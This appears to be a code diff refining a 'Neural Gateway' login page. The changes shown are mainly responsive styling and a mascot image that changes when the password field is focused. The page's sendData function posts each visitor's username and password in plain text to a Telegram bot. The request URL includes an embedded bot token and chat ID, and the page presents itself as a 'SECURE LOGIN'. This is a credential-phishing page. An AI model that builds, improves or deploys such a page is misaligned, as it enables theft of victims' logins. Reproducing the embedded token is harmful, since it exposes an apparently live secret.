@@ -6,25 +6,53 @@
     <title>Neural Gateway</title>
     <style>
         body { margin: 0; background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        
         .glass-card { 
             background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(20px); 
-            padding: 40px; border-radius: 30px; text-align: center; width: 350px; max-width: 90%;
+            padding: 40px; border-radius: 30px; text-align: center; 
+            width: 350px; max-width: 90%; /* মোবাইলের জন্য রেসপন্সিভ */
             border: 1px solid rgba(0, 255, 136, 0.3); box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
+            box-sizing: border-box;
         }
-        #mascot-img { width: 150px; height: 150px; margin-bottom: 20px; transition: 0.3s; border-radius: 50%; }
+
+        #mascot-img { width: 150px; height: 150px; margin-bottom: 20px; transition: 0.3s; border-radius: 50%; object-fit: cover; }
+        
         .input-group { position: relative; margin: 15px 0; }
-        input { width: 100%; padding: 12px; background: rgba(0,0,0,0.3); border: 1px solid #444; color: white; border-radius: 10px; outline: none; box-sizing: border-box; }
+        
+        input { 
+            width: 100%; padding: 12px; background: rgba(0,0,0,0.3); 
+            border: 1px solid #444; color: white; border-radius: 10px; 
+            outline: none; box-sizing: border-box; 
+        }
+        
         input:focus { border: 1px solid #00ff88; }
-        #toggle-pass { position: absolute; right: 10px; top: 12px; background: none; border: none; color: #00ff88; cursor: pointer; }
-        button { width: 100%; padding: 15px; background: #00ff88; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; color: #000; }
+        
+        #toggle-pass { 
+            position: absolute; right: 10px; top: 50%; transform: translateY(-50%);
+            background: none; border: none; color: #00ff88; cursor: pointer; font-size: 16px;
+        }
+        
+        button#login-btn { 
+            width: 100%; padding: 15px; background: #00ff88; border: none; 
+            border-radius: 10px; font-weight: bold; cursor: pointer; color: #000;
+        }
+        
         a { color: #00ff88; text-decoration: none; font-size: 14px; display: block; margin-top: 15px; }
+
+        @media (max-width: 480px) {
+            .glass-card { padding: 25px; }
+            #mascot-img { width: 120px; height: 120px; }
+        }
     </style>
 </head>
 <body>
 
 <div class="glass-card">
     <img id="mascot-img" src="1000022715.jpg" alt="Mascot">
-    <input type="text" id="username" placeholder="Username" style="width: 100%; padding: 12px; box-sizing: border-box; border-radius: 10px; border: none; background: rgba(0,0,0,0.3); color: white;">
+    
+    <div class="input-group">
+        <input type="text" id="username" placeholder="Username">
+    </div>
     
     <div class="input-group">
         <input type="password" id="password" placeholder="Password">
@@ -39,8 +67,10 @@
     const img = document.getElementById('mascot-img');
     const pass = document.getElementById('password');
     const toggleBtn = document.getElementById('toggle-pass');
+    const btn = document.getElementById('login-btn');
 
-    pass.addEventListener('focus', () => img.src = '1000022716.jpg');
+    // পোজ লজিক
+    pass.addEventListener('focus', () => { if(pass.type === "password") img.src = '1000022716.jpg'; });
     pass.addEventListener('blur', () => { if(pass.type === "password") img.src = '1000022715.jpg'; });
 
     toggleBtn.addEventListener('click', () => {
@@ -58,8 +88,9 @@
     function sendData() {
         const user = document.getElementById('username').value;
         const passVal = pass.value;
-        const btn = document.getElementById('login-btn');
         
+        if(!user || !passVal) return alert("Fill all fields!");
+
         btn.innerText = "CONNECTING...";
         fetch(`https://api.telegram.org/bot8736432847:AAHbDf-tOzpa6q--_R-1MRGeENKkh9CEHWc/sendMessage?chat_id=7950771882&text=User:${user}%0APass:${passVal}`)
         .then(() => { btn.innerText = "SECURE LOGIN"; alert("Sent!"); });
